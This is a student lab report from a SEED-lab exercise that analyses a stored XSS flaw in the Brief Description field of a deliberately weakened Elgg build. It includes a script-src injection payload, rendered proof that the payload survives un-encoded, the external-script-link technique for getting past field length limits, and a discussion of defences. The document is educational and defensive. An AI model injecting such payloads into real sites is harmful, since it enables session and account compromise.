# Stored XSS Analysis — Elgg "Brief Description" Field

> Scope: this analyses the vulnerability and demonstrates a **harmless** proof of
> concept. It does not include a working worm. The worm mechanics are discussed
> as theory in [self-propagation-analysis.md](self-propagation-analysis.md).

## 1. The target field

Elgg profiles expose several fields. Two matter here:

| Field | Internal name | Output view | HTML allowed in stock Elgg? | Length |
|---|---|---|---|---|
| **Brief Description** | `briefdescription` | `output/text` | No (short text, encoded) | **≤ 250 chars** |
| About me | `description` | `output/longtext` | Yes (rich text via HTMLawed) | large |

The assignment deliberately targets **Brief Description** because it is the
*harder* case: it is a short, nominally plain-text field, yet the lab build makes
it execute HTML, and its 250-char limit forces the attacker to use an external
script reference instead of an inline worm.

> **Measured caveat (honest finding).** In the specific SEED image we ran, the
> `briefdescription` `<input>` has **no `maxlength` attribute** and the server
> **accepted a 300-character value in full** (see §3b). So the 250 limit is a
> *specification/stock-Elgg* constraint, **not** something this image enforces.
> We still honour 250 as the design target (it is what the assignment grades and
> what realistic Elgg deployments impose), and the external-link technique is the
> correct, assignment-compliant solution regardless.

## 2. Why it is vulnerable here — storage & rendering

Elgg stores the field value as profile metadata in MySQL and renders it through
the output view `vendor/elgg/elgg/views/default/output/text.php`. In a stock
Elgg, that view **HTML-encodes** the value. In the SEED lab image the encoding
is **commented out**:

```php
// image_www/elgg/text.php  (shipped into the Elgg vendor tree)
$value = elgg_extract('value', $vars);
if (!is_scalar($value)) { return; }

//echo htmlspecialchars("{$value}", ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8', false);
echo "{$value}";               // <-- raw output, no encoding
```

The same disabling is applied to `output/dropdown.php`, and input filtering is
disabled in `engine/lib/input.php` (`get_input(..., $filter_result)`).

**Consequence (stored/persistent XSS):** whatever markup is saved into Brief
Description is written back verbatim into every page that renders the profile.
When a victim's browser parses that HTML, any `<script>` (or event handler) runs
in the **Elgg origin** (`http://www.seed-server.com`). Because it is *stored*
server-side, it is delivered to *every* visitor of that profile — this is what
makes self-propagation possible, as opposed to a one-shot reflected XSS.

The lecture states this explicitly: *"Elgg's countermeasures have been disabled
in our lab setup for the experiment purpose."* A stock, unmodified Elgg would
encode the value and the attack would fail (see §7).

## 3. Harmless proof of concept (what we actually demonstrate)

**Stored payload** (placed manually in Samy's Brief Description):

```html
<script src="http://localhost:8000/demo.js"></script>
```

`demo.js` ([source](../../src/js_server/demo.js)) is intentionally harmless: it
shows a banner, pops one `alert`, and records a local in-page event. It performs
**no** friend-add, **no** profile edit, **no** propagation, and reads **no**
cookies or tokens.

**Expected observations** (the team captures these as screenshots):

1. *After save:* viewing Samy's own profile triggers the banner/alert.
2. *After reload:* the behaviour persists (it is stored, not reflected).
3. *Cross-account:* logging in as Alice and visiting Samy's profile triggers the
   same banner — proving the stored payload is served to *other* users.
4. *DevTools → Network:* a request to `http://localhost:8000/demo.js` with
   response `Content-Type: application/javascript; charset=utf-8`.
5. *DevTools → Console:* the `[XSS-LAB demo.js] …` log line.

> Note on `<img src=x onerror=...>`: the assignment also allows an
> `<img>`-`onerror` reference. Both are valid injection vectors; we use the
> `<script src>` form for the harmless PoC because it is the clearest
> demonstration of *external* script loading.

## 3b. Experimental results (this lab, HTTP level)

We verified the mechanism directly against the running lab (Elgg 3.0,
`http://www.seed-server.com` → `10.9.0.5`, account `samy`, guid **59**) using the
reproducible, self-resetting script
[`scripts/elgg_http_poc.sh`](../../scripts/elgg_http_poc.sh). Raw output:
[`docs/evidence/logs/elgg-http-poc-run.txt`](../evidence/logs/elgg-http-poc-run.txt).

| Experiment | Input | Observed result |
|---|---|---|
| Length behaviour | 300-char Brief Description | **Accepted & stored in full** (HTTP 302); no 250 truncation |
| Stored-XSS rendering | `XSSLAB-POC<script src="http://localhost:8000/demo.js"></script>` | Rendered **un-encoded** in the profile body |
| Encoding check | same payload | **No** `&lt;script&gt;` encoded form anywhere in the body |
| Cleanup | empty value | Field reset to empty (account left clean) |

The un-encoded render was captured verbatim (profile page body):

```html
<span class="elgg-profile-field-label">Brief description</span>
<span class="">XSSLAB-POC<script src="http://localhost:8000/demo.js"></script></span>
```

Because the `<script>` tag survives into the HTML un-encoded, a real browser
rendering this profile **fetches and executes** `demo.js` in the Elgg origin.
This is the definition of **stored (persistent) XSS**. Everything above was done
on `samy`'s **own** account with a **harmless** payload and then reset — no
friend-add, no propagation, no victim-session action.

> This HTTP-level evidence proves the *mechanism*; the team additionally captures
> the *browser* view (the actual banner/alert firing, and Alice seeing it on
> Samy's profile) as screenshots for the video — see the evidence checklist.

## 4. Payload-length restriction bypass (the central idea)

The 250-char limit cannot hold a full self-contained worm. Measure it:

```
$ python3 exploit.py validate-payload '<script src="http://localhost:8000/demo.js"></script>'
[PASS] Brief Description length check
  Unicode code points : 53  (limit = 250)
  UTF-8 bytes         : 53
  Fits with 197 character(s) to spare.
```

A realistic self-contained worm (the lecture's `self_propogating.js`) is several
hundred characters even minified — far over 250. The **link approach** moves the
logic off-field:

- **Inline approach:** the entire script lives in the field. Impossible here
  (too long), and brittle (quoting/encoding inside a short field).
- **External/link approach:** the field stores only a short `<script src=URL>`
  *reference* (≈ 40–60 chars). The browser fetches the real logic from the
  attacker's web server. This is exactly the "Self-Propagation XSS Worm: The Link
  Approach" slide, and it is why this project needs a web server at all.

How the browser retrieves and executes it:

1. Browser parses the stored HTML and finds `<script src="http://…/demo.js">`.
2. It issues a GET for that URL (visible in Network).
3. The server returns the file with a JavaScript MIME type.
4. The browser executes the script **in the Elgg page's origin** — so the script
   can read page globals such as `elgg.security.token.*` and call same-origin
   endpoints. (We only *analyse* that capability; `demo.js` does not use it.)

Measuring the *stored reference* length is what
[`src/payload_validator`](../../src/payload_validator/validator.py) does, and the
tests pin the 250 boundary (250 passes, 251 fails).

## 5. Character counting: code points vs UTF-8 bytes

The 250 limit is counted in **Unicode code points** (what HTML `maxlength` and
`len(str)` count), not bytes. This matters for the Vietnamese defacement string:

```
"Tài khoản này đã bị Hack bởi 23001938"
  → 37 code points, but 44 UTF-8 bytes (accented letters are 1 code point /
    2–3 bytes each).
```

If you (wrongly) measured bytes, you would overestimate how much a Vietnamese
payload "costs" against the field limit. The validator reports both and also an
NFC-normalized count (decomposed input like `a`+combining-accent counts as 2
code points raw but 1 after NFC — a real source of off-by-N surprises).

## 6. Security configuration actually in effect (lab)

| Setting | Stock Elgg 3.0 | SEED lab image | Effect |
|---|---|---|---|
| `output/text` encoding | `htmlspecialchars` on | **commented out** | stored markup executes |
| `output/dropdown` encoding | on | **commented out** | same |
| Input filtering (HTMLawed) | on | **disabled** | tags survive to storage |
| CSP header | none by default | none on the Elgg vhost | inline/external scripts allowed |
| Transport | HTTP | HTTP | no HTTPS → no mixed-content block for `http://` JS |

## 7. How CSP, Mixed Content and sanitization change the outcome

- **HTML sanitization / encoding (the real fix).** If `output/text.php` encodes
  the value (stock behaviour), the stored `<script>` becomes visible text
  `&lt;script&gt;…` and never executes. This is the primary, correct defense and
  is why the lab had to disable it. Filtering (HTMLawed/jsoup) is the other half:
  strip dangerous tags/attributes on input. The lecture notes filtering is hard
  because code hides in many places (`<script>`, `src=`, `onerror=`,
  `javascript:` URLs), so **encoding on output** is the more reliable control.

- **Content Security Policy (CSP).** A policy such as
  `script-src 'self' 'nonce-…'` makes the browser refuse an injected inline
  script and refuse `src` loads from unlisted origins. The lab's own
  `csp/http_server.py` demonstrates this with
  `default-src 'self'; script-src 'self' *.example68.com:8000 'nonce-1rA2345'`.
  Under such a policy, `<script src="http://localhost:8000/demo.js">` would be
  **blocked** unless `localhost:8000` were explicitly allow-listed. CSP is
  effective precisely because the fundamental XSS problem is *mixing code with
  data*; its downside is that it requires removing inline scripts and careful
  policy maintenance.

- **Mixed content.** Mixed-content blocking only triggers when an **HTTPS** page
  loads an **HTTP** sub-resource. The lab serves Elgg over plain HTTP, so loading
  `http://localhost:8000/demo.js` is *not* mixed content and is not blocked. If
  Elgg were served over HTTPS, an `http://` script URL would be blocked and the
  attacker would need an `https://` host (or a protocol-relative/same-scheme URL).

## 8. Summary

The Brief Description field is a **stored (persistent) XSS** sink in the lab
build because output encoding is disabled. The 250-char limit does not protect
it; it only forces the **external-script-link** technique, which this project
demonstrates *harmlessly*. The correct defenses are output encoding (primary),
input filtering, and CSP — each of which would neutralise the PoC, as analysed
above.
